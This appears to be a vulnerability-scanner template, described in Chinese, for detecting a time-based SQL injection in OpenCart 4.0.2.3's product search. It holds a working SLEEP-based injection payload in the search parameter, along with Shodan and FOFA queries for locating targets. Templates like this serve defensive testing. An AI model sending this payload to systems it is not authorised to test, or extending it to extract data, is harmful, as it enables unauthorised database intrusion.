id: opencart-core-sqli

info:
  name: OpenCart Core 4.0.2.3 'search' - SQL 注入漏洞
  author: s4e-io
  severity: high
  description: |
    该模板用于检测 OpenCart Core 4.0.2.3 'search' - SQL 注入漏洞。该类漏洞通常源于接口将用户可控参数直接拼接进 SQL 语句，导致查询语义被篡改。模板会根据请求响应中的状态码、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可通过注入参数读取、篡改或删除数据库中的敏感数据。
    - 在数据库权限过高或支持危险函数的场景下，SQL 注入还可能导致认证绕过、文件读写或进一步执行系统命令。
  remediation: |
    - 对所有数据库访问使用参数化查询或安全 ORM，避免拼接用户可控输入。
    - 对受影响接口的参数进行类型、长度和取值范围校验，并关闭详细数据库错误回显。
    - 使用最小权限数据库账号，排查异常查询、数据导出和新增账号记录。
  reference:
    - https://www.exploit-db.com/exploits/51940
    - https://cxsecurity.com/issue/WLB-2024040004
  classification:
    cpe: cpe:2.3:a:opencart:opencart:*:*:*:*:*:*:*:*
    cwe-id: CWE-89
  metadata:
    max-request: 2
    shodan-query: title:"OpenCart"
    fofa-query: icon_hash="-1443008128"
    product: opencart
    vendor: opencart
  tags: time-based-sqli,opencart,sqli,vuln
flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    matchers:
      - type: dsl
        dsl:
          - 'contains(header, "OCSESSID=")'
          - 'contains_any(body, "opencart.com", "OpenCart is open source", "content=\"OpenCart")'
        condition: or
        internal: true

  - raw:
      - |
        @timeout: 15s
        GET /index.php?route=product/search&search=')+AND+(SELECT+8368+FROM+(SELECT(SLEEP(7)))uUDJ)--+Nabb HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "duration>=7"
          - 'contains(body, "Nabb</title>")'
          - "status_code == 200"
        condition: and
